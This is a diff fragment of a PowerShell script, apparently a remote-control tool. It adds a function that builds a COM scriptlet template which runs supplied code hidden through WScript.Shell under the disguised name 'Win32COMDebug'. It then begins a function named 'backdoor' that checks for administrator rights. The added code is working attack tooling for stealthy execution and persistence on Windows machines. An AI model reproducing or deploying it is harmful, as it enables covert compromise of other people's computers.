@@ -102,6 +102,34 @@ function turnOffScreen {
     [Utilities.Display]::PowerOff()
 }
 
+
+
+function crea_plantilla_sct {param ($code)
+$plantilla_sct = '<?XML version="1.0"?>
+<scriptlet>
+<registration
+description="Win32COMDebug"
+progid="Win32COMDebug"
+version="1.00"
+classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+ >
+ <script language="JScript">
+      <![CDATA[
+           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
+      ]]>
+ </script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+</scriptlet>'
+return $plantilla_sct}
+
+
+
+
+
+
 function backdoor {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {Send-Message "Sorry, necesitas privilegios"; return Send-Message;break }  else {
